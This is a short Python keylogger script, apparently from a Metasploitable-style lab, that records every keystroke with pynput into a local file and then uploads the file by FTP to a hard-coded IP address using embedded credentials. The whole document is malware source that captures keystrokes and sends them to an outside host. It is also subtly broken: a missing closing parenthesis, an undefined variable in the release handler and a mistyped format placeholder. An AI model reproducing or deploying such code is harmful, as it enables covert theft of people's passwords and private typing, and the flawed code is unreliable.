from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = ""

logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s"

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key (0) has been pressed.".format(Key))

def releasing_key(Key):
    if key == Key.esc:
        return False
                
print("\nStarted Listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()                                                                             #ESC to stop
                    
print("\nConnecting to the FTP and sending the data...\n")

sess = ftplib.FTP("192.168.68.145","msfadmin","msadmin")   #IP, usrname and pswd of the vulnerable machine
                    
file = open("klog-res.txt","rb")
sess.storbinary("STOR klog-res.txt",file)
file.close()
sess.quit()
